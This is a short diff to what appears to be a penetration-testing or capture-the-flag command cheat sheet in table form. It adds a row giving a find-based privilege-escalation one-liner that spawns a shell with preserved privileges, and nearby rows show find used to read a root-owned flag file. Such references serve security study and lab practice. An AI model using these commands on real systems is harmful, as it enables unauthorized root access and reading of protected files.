@@ -39,3 +39,5 @@
 | `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
 | `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |
 | find /root/thefinalflag.txt -exec cat {} ;                                          | when Find perm to read file                           |
+| <pre><code>/usr/bin/find . -exec /bin/sh -p \; -quit
+</code></pre>                  | privesc with Find perm                                |
